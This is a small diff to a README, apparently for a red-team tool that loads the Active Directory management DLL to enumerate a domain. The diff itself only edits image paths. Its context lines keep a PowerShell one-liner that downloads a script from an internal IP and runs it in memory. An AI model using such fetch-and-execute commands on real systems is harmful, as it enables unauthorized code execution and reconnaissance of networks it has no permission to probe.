@@ -9,14 +9,14 @@ You can copy this DLL to your machine and use it to enumerate Active Directory w
 Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
 ```
 
-![](images/import_dll.png)
+![](./images/import_dll.png)
 
 Alternatively, you can use the ps1 script to download and execute in memory
 ```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.137.128/Import-ActiveDirectory.ps1');Import-ActiveDirectory
 ```
 
-![](images/import_example.png)
+![](./images/import_example.png)
 
 To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.
 ```powershell
